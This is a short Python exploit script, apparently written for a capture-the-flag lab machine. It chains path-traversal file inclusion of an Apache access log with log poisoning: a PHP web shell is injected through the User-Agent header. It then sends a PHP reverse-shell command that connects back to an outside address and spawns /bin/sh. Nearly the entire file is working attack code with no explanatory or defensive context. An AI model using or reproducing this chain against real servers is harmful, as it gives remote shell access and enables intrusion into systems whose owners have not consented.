import requests

url = "http://10.10.231.251"
url_access_log = "http://10.10.231.251/?view=dog/../../../../../../var/log/apache2/access.log&ext"

# inject `cmd` parameter in User-Agent to execute unix command later
headers = {
    "User-Agent": "<?php system($_GET['cmd']);?>"
}

# requests.get(url, headers=headers)
params = {
    'cmd': 'php -r \'$sock=fsockopen("10.11.8.57",4242);exec("/bin/sh -i <&3 >&3 2>&3");\''
}
# test `cmd` parameter is working
r = requests.get(url_access_log, params=params)
print(r.text)

# add php revese shell to server
# with open("./shell.php", "r") as f:
#     shell = f.read()

# print(f'echo {shell} > shell.php')
